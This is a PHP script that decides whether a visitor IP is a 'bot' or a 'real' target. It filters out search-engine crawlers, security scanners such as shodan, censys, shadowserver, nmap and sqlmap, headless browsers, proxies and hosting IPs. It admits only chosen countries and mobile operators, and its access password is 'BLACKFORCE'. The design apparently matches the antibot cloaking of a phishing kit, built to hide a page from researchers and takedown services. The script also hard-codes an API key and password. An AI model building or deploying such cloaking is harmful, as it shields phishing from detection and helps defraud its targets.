<?php
require_once "../cors.php";

// ─── Configuration ────────────────────────────────────────────────────────────
define('API_KEY',       'NCx0PDVOcBsh1pQ');
define('BLACKLIST_FILE','./blacklist.txt');
define('VISITORS_FILE', './visitors.json');
define('ACCESS_PWD',    'BLACKFORCE');

// ─── Pays autorisés ───────────────────────────────────────────────────────────
const ALLOWED_COUNTRIES = [
    "AF","AX","AL","DZ","AS","AD","AO","AI","AQ","AG","AR","AM","AW","AU","AT","AZ",
    "CO","KM","CG","CD","CK","CR","CI","HR","CU","CW","CY","CZ",
    "DK","DJ","DM","CH",
    "EC","EG","SV","GQ","DE","EE","SZ","ET",
    "FK","FO","FJ","FI","FR","GF","PF","TF",
    "GA","GM","GE","GH","GI","GR","GL","GD","GP","GU","GT","GG","GN","GW","GY",
    "HT","HM","VA","HN","HK","HU",
];

// ─── User-Agents de bots connus ───────────────────────────────────────────────
const BOT_USER_AGENTS = [
    'googlebot','google-read-aloud','adsbot-google','mediapartners-google',
    'bingbot','msnbot','bingpreview',
    'yahoo','slurp',
    'duckduckbot',
    'baiduspider',
    'yandexbot','yandex',
    'sogou','exabot',
    'facebot','facebookexternalhit','facebookbot',
    'ia_archiver','archive.org',
    'semrushbot','ahrefsbot','mj12bot','dotbot','rogerbot','linkdexbot','seokicks',
    'screaming frog','screamingfrog',
    'masscan','zgrab','shodan','censys','stretchoid','shadowserver',
    'python-requests','python-urllib','libwww-perl',
    'curl/','wget/','go-http-client',
    'axios','node-fetch','node.js',
    'headlesschrome','phantomjs','selenium','puppeteer','playwright',
    'nmap','nikto','sqlmap',
    'petalbot','bytespider','applebot','twitterbot','linkedinbot',
];

// ─── Utilitaires ──────────────────────────────────────────────────────────────

function isValidIp(string $ip): bool
{
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

function getIpInfo(string $ip): ?array
{
    $url  = "https://pro.ip-api.com/json/{$ip}?key=" . API_KEY . "&fields=status,message,country,countryCode,isp,org,as,proxy,hosting,query";
    $ctx  = stream_context_create(['http' => ['timeout' => 5]]);
    $raw  = @file_get_contents($url, false, $ctx);

    if ($raw === false) return null;

    $data = json_decode($raw, true);
    return is_array($data) ? $data : null;
}

function logVisitor(string $ip, string $code, string $org, string $country, string $status): void
{
    $visits = [];
    if (file_exists(VISITORS_FILE)) {
        $raw    = file_get_contents(VISITORS_FILE);
        $visits = json_decode($raw, true) ?? [];
    }

    $nextId    = empty($visits) ? 1 : (end($visits)['id'] + 1);
    $visits[]  = [
        'id'        => $nextId,
        'ip'        => $ip,
        'code'      => $code,
        'operator'  => $org,
        'country'   => $country,
        'status'    => $status,
        'timestamp' => date('Y-m-d H:i:s'),
    ];

    file_put_contents(VISITORS_FILE, json_encode($visits, JSON_PRETTY_PRINT));
}

function ipInBlacklist(string $ip): bool
{
    if (!file_exists(BLACKLIST_FILE)) return false;

    $lines = file(BLACKLIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array(trim($ip), array_map('trim', $lines), true);
}

function isBotUserAgent(): bool
{
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    if (empty($ua)) return true; // pas d'UA = bot

    foreach (BOT_USER_AGENTS as $bot) {
        if (str_contains($ua, $bot)) return true;
    }
    return false;
}

function botResponse(string $org, string $country, string $code): array
{
    return ['status' => 'bot', 'operator' => $org, 'country' => $country, 'code' => $code];
}

function realResponse(string $org, string $country, string $code): array
{
    return ['status' => 'real', 'operator' => $org, 'country' => $country, 'code' => $code];
}

// ─── Fonction principale ───────────────────────────────────────────────────────

function checkBot(string $ip): array|string
{
    // 1. Validation IP
    if (!isValidIp($ip)) {
        return ['status' => 'error', 'message' => 'Invalid IP address.'];
    }

    // 2. Vérification User-Agent
    if (isBotUserAgent()) {
        logVisitor($ip, '', 'UA-blocked', '', 'bot');
        return botResponse('UA-blocked', 'Unknown', '');
    }

    // 3. Récupération infos IP
    $info = getIpInfo($ip);
    if (!$info) {
        return ['status' => 'error', 'message' => 'Failed to retrieve IP info for ' . $ip];
    }

    $status      = $info['status']      ?? 'fail';
    $countryCode = $info['countryCode'] ?? '';
    $country     = $info['country']     ?? '';
    $as          = $info['as']          ?? '';
    $isp         = $info['isp']         ?? '';
    $org         = $info['org']         ?? '';
    $isProxy     = $info['proxy']       ?? false;
    $isHosting   = $info['hosting']     ?? false;

    $operator = $as ?: $isp ?: $org;

    // 4. Log visiteur
    logVisitor($ip, $countryCode, $operator, $country, $status);

    if ($status !== 'success') {
        return ['status' => 'error', 'message' => 'IP-API lookup failed for ' . $ip];
    }

    // 5. Proxy / VPN / Hosting détecté
    if ($isProxy || $isHosting) {
        return botResponse($operator, $country, $countryCode);
    }

    // 6. Pays autorisé ?
    if (!in_array($countryCode, ALLOWED_COUNTRIES, true)) {
        return botResponse($operator, $country, $countryCode);
    }

    // 7. ISP bloqué ?
    $blockedIsps = include './block.php';
    foreach ($blockedIsps as $blocked) {
        if (stripos($operator, $blocked) !== false) {
            return botResponse($operator, $country, $countryCode);
        }
    }

    // 8. Vérification opérateur par pays
    $operatorsByCountry = include './operators.php';

    if (array_key_exists($countryCode, $operatorsByCountry)) {
        foreach ($operatorsByCountry[$countryCode] as $allowedOperator) {
            if (stripos($operator, $allowedOperator) !== false) {
                return realResponse($operator, $country, $countryCode);
            }
        }
        return botResponse($operator, $country, $countryCode);
    }

    // 9. Pays non référencé dans operators.php
    return ['status' => 'error', 'message' => 'Country not configured: ' . $countryCode . ' | ' . $ip . ' | ' . $operator];
}

// ─── Point d'entrée ───────────────────────────────────────────────────────────

if (
    $_SERVER['REQUEST_METHOD'] === 'GET'
    && isset($_GET['ip'], $_GET['PWD'])
    && $_GET['PWD'] === ACCESS_PWD
) {
    $ip = trim($_GET['ip']);

    // Blacklist locale
    if (ipInBlacklist($ip)) {
        echo json_encode(['status' => 'blacklist', 'ip' => $ip]);
        exit;
    }

    $result = checkBot($ip);
    header('Content-Type: application/json');
    echo json_encode($result);

} else {
    http_response_code(403);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request.']);
}